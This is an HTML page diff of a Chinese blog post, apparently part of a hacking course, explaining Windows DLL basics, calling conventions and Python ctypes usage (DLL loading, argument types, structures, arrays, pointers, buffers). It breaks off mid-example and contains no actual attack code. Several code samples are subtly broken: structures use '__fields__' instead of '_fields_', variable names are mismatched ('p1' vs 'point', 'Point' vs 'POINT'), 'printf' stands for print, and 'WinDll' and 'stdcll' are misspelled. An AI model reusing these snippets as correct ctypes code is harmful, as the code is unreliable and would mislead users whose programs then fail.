@@ -1,0 +1,1562 @@
+<!DOCTYPE HTML>
+<html lang="zh-cn">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="应用程序攻击, Airi Suzuki">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>应用程序攻击 | Airi Suzuki</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Airi Suzuki" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Airi Suzuki</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>Contact</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Airi Suzuki</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">应用程序攻击</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2021-03-18
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="一、Windows应用程序的基本概念"><a href="#一、Windows应用程序的基本概念" class="headerlink" title="一、Windows应用程序的基本概念"></a>一、Windows应用程序的基本概念</h1><ul>
+<li>对Windows应用程序进行黑客攻击，必须拥有Windows API基础知识</li>
+<li>开发Windows应用程序时，往往要使用各种lib与DLL库</li>
+<li>lib是静态库，生成Windows可执行文件（exe文件）时，它们被包含到程序</li>
+<li>DLL是动态链接库，应用程序运行时，才会加载调用相应的DLL库。Win32API大部分以DLL库形式存在<br><img src="https://www.hualigs.cn/image/60534b2984c14.jpg" alt=""></li>
+</ul>
+<p>Win32 API提供了多种用于控制低级操作系统功能的接口，所以不仅用于开发一般程序，还广泛应用于程序调试与黑客攻击程序的开发</p>
+<h1 id="二、在Python中使用Win32-API"><a href="#二、在Python中使用Win32-API" class="headerlink" title="二、在Python中使用Win32 API"></a>二、在Python中使用Win32 API</h1><ul>
+<li>Python默认提供ctypes模块（ctypes在Python2和Python3中有所不同），通过它可以在Python代码中调用DLL，使用C/C++的变量类型（想实现更高级的黑客攻击技术，必须理解掌握ctypes）</li>
+<li>ctypes可以在Windows、Linux、UNIX、OS X、Android等多种平台中使用</li>
+<li>ctypes适合于“中轻量级”的Python、C/C++混合编程</li>
+</ul>
+<h1 id="三、ctypes模块的基本概念"><a href="#三、ctypes模块的基本概念" class="headerlink" title="三、ctypes模块的基本概念"></a>三、ctypes模块的基本概念</h1><ul>
+<li><p>ctypes简化了动态库的调用过程，支持复杂的C数据类型，提供低级函数。使用ctypes模块时，只要遵守函数调用约定，即可直接调用操作系统提供的API<br><img src="https://www.hualigs.cn/image/60534b297553e.jpg" alt=""></p>
+</li>
+<li><p>由于本地库与Python的函数调用方式、数据类型等彼此不同，所以要熟悉基本的ctypes语法，准确实现二者间的映射</p>
+</li>
+<li><p>ctypes支持多种调用约定（Calling Convention）</p>
+<ul>
+<li>cdll=cdecl</li>
+<li>windll=stdcll</li>
+<li>oledll=stdcall（其返回值假定为HRESULT）</li>
+</ul>
+</li>
+<li><p>cdecl是C/C++的默认调用约定</p>
+<ul>
+<li>参数从右至左传递（入栈），由调用者（caller）清理栈区</li>
+</ul>
+</li>
+<li><p>stdcall是Windows API默认调用约定</p>
+<ul>
+<li>微软的WINAPI、CALLBACK等宏都是该调用约定</li>
+<li>参数从右至左传递（入栈），被调用者（callee）清理栈区</li>
+</ul>
+</li>
+<li><p>fastcall</p>
+<ul>
+<li>参数从右至左传递（入栈），前2/4个参数被分别放进了ecx、edx（、r8、r9）寄存器，被调用者（callee）清理栈区</li>
+<li>Win64统一为类似fastcall的调用约定</li>
+</ul>
+</li>
+</ul>
+<h1 id="四、ctype基本用法"><a href="#四、ctype基本用法" class="headerlink" title="四、ctype基本用法"></a>四、ctype基本用法</h1><h3 id="1-加载DLL和获取函数"><a href="#1-加载DLL和获取函数" class="headerlink" title="1.加载DLL和获取函数"></a>1.加载DLL和获取函数</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> platform
+<span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span>
+<span class="token keyword">if</span> platform<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'Windows'</span><span class="token punctuation">:</span>
+    libc<span class="token operator">=</span>cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'msvcrt.dll'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#系统C标准库动态链接文件</span>
+    dll<span class="token operator">=</span>windll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span>dllpath<span class="token punctuation">)</span>
+<span class="token keyword">elif</span> platform<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'Linux'</span><span class="token punctuation">:</span>
+    libc<span class="token operator">=</span>cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span></code></pre>
+<ul>
+<li>使用哪一行代码取决于导出函数的调用规范（cdecl或stdcall）</li>
+<li>也可以使用下面两行代码代替：</li>
+</ul>
+<pre class=" language-python"><code class="language-python">libc<span class="token operator">=</span>CDLL<span class="token punctuation">(</span><span class="token string">'msvcrt.dll'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#注意和上面大小写的区别</span>
+dll<span class="token operator">=</span>WinDll<span class="token punctuation">(</span>dllpath<span class="token punctuation">)</span></code></pre>
+<ul>
+<li>加载dll后，可得到dll中的导出函数</li>
+</ul>
+<pre class=" language-python"><code class="language-python">func<span class="token operator">=</span>dll<span class="token punctuation">.</span>func_name    <span class="token comment" spellcheck="true">#func_name是dll的导出函数</span></code></pre>
+<ul>
+<li>有些Windows动态链接库导出函数不是用名字，而是用序号（ordinal），这时需通过索引获取</li>
+</ul>
+<pre class=" language-python"><code class="language-python">func<span class="token operator">=</span>cdll<span class="token punctuation">.</span>kernel32<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></code></pre>
+<ul>
+<li>得到函数后，要进行正确的函数调用，需设置好参数和返回值类型</li>
+</ul>
+<h3 id="2-ctypes数据类型与C和Python对应关系"><a href="#2-ctypes数据类型与C和Python对应关系" class="headerlink" title="2.ctypes数据类型与C和Python对应关系"></a>2.ctypes数据类型与C和Python对应关系</h3><p><img src="https://www.hualigs.cn/image/60534b296c079.jpg" alt=""></p>
+<ul>
+<li>Python中的类型，除了None，int，long，Byte String，Unicode String作为C函数的参数默认提供转换外，其它类型都必须显式提供转换<ul>
+<li>None：对应C中的NULL</li>
+<li>int，long：对应C中的int，具体实现时会根据机器字长自动适配/截断</li>
+<li>Byte String：对应C中的一个字符串指针char*，指向一块内存区域</li>
+<li>Unicode String：对应C中一个宽字符串指针wchar_t*，指向一块内存区域</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-函数参数和返回值"><a href="#3-函数参数和返回值" class="headerlink" title="3.函数参数和返回值"></a>3.函数参数和返回值</h3><ul>
+<li>设置函数的参数类型使用函数的argtypes属性，直接赋值为一个ctypes类型的列表或元组</li>
+<li>设置函数的返回值类型使用函数的restype属性</li>
+</ul>
+<pre class=" language-python"><code class="language-python">func<span class="token punctuation">.</span>argtypes<span class="token operator">=</span><span class="token punctuation">(</span>c_int<span class="token punctuation">,</span>c_int<span class="token punctuation">,</span>c_int<span class="token punctuation">,</span>c_void_p<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#设置函数参数类型为int,int,int,void*</span>
+func<span class="token punctuation">.</span>restype<span class="token operator">=</span>c_float    <span class="token comment" spellcheck="true">#设置返回值类型为float</span></code></pre>
+<ul>
+<li>python中，默认函数返回值为c_int型，可以不用显式设置函数的restype属性，若参数类型不是c_int型则需要设置</li>
+<li>除了整数、字节串和字符串以外Python类型的参数传递，必须使用ctypes类型做包装</li>
+</ul>
+<h3 id="4-结构体"><a href="#4-结构体" class="headerlink" title="4.结构体"></a>4.结构体</h3><ul>
+<li>自定义的结构体和联合体必须继承自ctypes的Structure和Union这两个类</li>
+<li>每一个子类必须定义_fields_属性，是一个二维的tuples列表，描述类的一个数据成员的字段名和类型</li>
+<li>字段类型必须是一个ctypes类型，如c_int，或者任何其他的继承ctypes的类型，如Structure，Union，Array，指针等</li>
+<li>例如一个简单结构，包含两个整型x和y</li>
+<li>也可创建复杂结构体 </li>
+</ul>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span>
+<span class="token keyword">import</span> types
+<span class="token keyword">class</span> <span class="token class-name">Point</span><span class="token punctuation">(</span>Structure<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    __fields__<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">,</span>c_int<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">,</span>c_int<span class="token punctuation">)</span><span class="token punctuation">]</span>
+p1<span class="token operator">=</span>Point<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>point<span class="token punctuation">.</span>x<span class="token punctuation">,</span>point<span class="token punctuation">.</span>y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出1 2</span></code></pre>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">RECT</span><span class="token punctuation">(</span>Structure<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    __fields__<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"upperleft"</span><span class="token punctuation">,</span>POINT<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"lowerright"</span><span class="token punctuation">,</span>POINT<span class="token punctuation">)</span><span class="token punctuation">]</span>
+rc<span class="token operator">=</span>RECT<span class="token punctuation">(</span>POINT<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>POINT<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>rc<span class="token punctuation">.</span>upperleft<span class="token punctuation">.</span>x<span class="token punctuation">,</span>rc<span class="token punctuation">.</span>upperleft<span class="token punctuation">.</span>y<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>rc<span class="token punctuation">.</span>lowerright<span class="token punctuation">.</span>x<span class="token punctuation">,</span>rc<span class="token punctuation">.</span>lowerright<span class="token punctuation">.</span>y<span class="token punctuation">)</span></code></pre>
+<h3 id="5-数组"><a href="#5-数组" class="headerlink" title="5.数组"></a>5.数组</h3><ul>
+<li>数组就是序列，包含固定数量的相同类型的实例。推荐的创建数组类型的方式是使用*和整数应用到类型</li>
+</ul>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span>
+<span class="token keyword">class</span> <span class="token class-name">POINT</span><span class="token punctuation">(</span>Structure<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    __fields__<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">,</span>c_int<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"y"</span><span class="token punctuation">,</span>c_int<span class="token punctuation">)</span><span class="token punctuation">]</span>
+TenPointsArrayType<span class="token operator">=</span>Point<span class="token operator">*</span><span class="token number">10</span>    <span class="token comment" spellcheck="true">#创建一个数组类型，由10个Point组成的数组</span>
+arr<span class="token operator">=</span>TenPointsArrayType<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建一个数组类的对象</span>
+type_int_array_10<span class="token operator">=</span>c_int<span class="token operator">*</span><span class="token number">10</span>    <span class="token comment" spellcheck="true">#先定义一个数组类型</span>
+type_int_array_10_10<span class="token operator">=</span>type_int_array_10<span class="token operator">*</span><span class="token number">10</span>    <span class="token comment" spellcheck="true">#定义二维数组</span>
+my_array<span class="token operator">=</span>type_int_array_10_10<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建二维数组对象</span>
+my_array<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">3</span>    <span class="token comment" spellcheck="true">#使用二维数组</span></code></pre>
+<h3 id="6-指针和引用"><a href="#6-指针和引用" class="headerlink" title="6.指针和引用"></a>6.指针和引用</h3><ul>
+<li>ctypes中用POINTER和pointer表示指针，使用POINTER时需要设置指向的数据类型，而pointer则直接从变量中得到一个特定类型的指针</li>
+<li>ctypes还可以用byref()函数直接从变量得到指针指向的数据类型，用于传递参数引用。通常使用byref()的地方同样也可用指针函数pointer()，但pointer()通常会额外创建一个指针对象，使用byref()会更快</li>
+</ul>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span>
+type_p_int<span class="token operator">=</span>POINTER<span class="token punctuation">(</span>c_int<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建指向整数的指针类型</span>
+v<span class="token operator">=</span>c_int<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#定义一个整数，值为4</span>
+p_int<span class="token operator">=</span>type_p_int<span class="token punctuation">(</span>v<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#给指针变量(p_int)赋值（为变量v的地址）</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>p_int<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#指针引用值使用[0]</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>p_int<span class="token punctuation">.</span>contents<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#指针实例的contents属性，返回指针所指向的对象，输出c_long(4)</span>
+v<span class="token operator">=</span>c_int<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#定义一个整数，值为4</span>
+p_int<span class="token operator">=</span>pointer<span class="token punctuation">(</span>v<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#直接得到v的指针，不需创建指针类型（省去类型声明）</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>p_int<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出4</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>p_int<span class="token punctuation">.</span>contents<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出c_long(4)</span></code></pre>
+<ul>
+<li>对指针类型c_char_p，c_wchar_p，c_void_p的赋值将会改变其指向的内存区域地址，而不是改变内存块的值（因为Python字符串是只读的）</li>
+<li>如果需要一个可写的内存块，使用函数create_string_buffer()创建</li>
+</ul>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>
+p<span class="token operator">=</span>create_string_buffer<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建3字节长的buf，且初始化为0</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>sizeof<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span>repr<span class="token punctuation">(</span>p<span class="token punctuation">.</span>raw<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出3'\x00\x00\x00'</span>
+p<span class="token operator">=</span>create_string_buffer<span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>    
+<span class="token keyword">print</span><span class="token punctuation">(</span>sizeof<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span>repr<span class="token punctuation">(</span>p<span class="token punctuation">.</span>raw<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出10'Hello\x00\x00\x00\x00\x00'</span>
+p<span class="token punctuation">.</span>value<span class="token operator">=</span><span class="token string">"Hi"</span>    <span class="token comment" spellcheck="true">#修改buf内容（这是可写的buf）</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>sizeof<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span>repr<span class="token punctuation">(</span>p<span class="token punctuation">.</span>raw<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出10'Hi\x00lo\x00\x00\x00\x00\x00'</span>
+pw<span class="token operator">=</span>create_unicode_buffer<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建一个unicode的buf，初始化为0</span>
+printf<span class="token punctuation">(</span>sizeof<span class="token punctuation">(</span>pw<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出6</span></code></pre>
+<h3 id="7-类型转换"><a href="#7-类型转换" class="headerlink" title="7.类型转换"></a>7.类型转换</h3><ul>
+<li>ctypes会做严格的类型检查</li>
+<li>但也可以传递兼容类型，如数组类型代替指针类型</li>
+<li>如果函数参数声明为某种指针类型（例如POINT(c_int)类型），则传递该指针指向的对象类型也是可以的（例如这里可以传递c_int），ctypes会自动加上byref()函数进行类型转换</li>
+<li>ctypes也提供了一个转换函数cast()，可以使用类似于C语言强制类型转换的方式进行类型转换</li>
+</ul>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">class</span> <span class="token class-name">BX</span><span class="token punctuation">(</span>Structure<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    __fields__<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"count"</span><span class="token punctuation">,</span>c_int<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span>POINTER<span class="token punctuation">(</span>c_int<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+b<span class="token operator">=</span>BX<span class="token punctuation">(</span><span class="token punctuation">)</span>
+b<span class="token punctuation">.</span>count<span class="token operator">=</span><span class="token number">3</span>
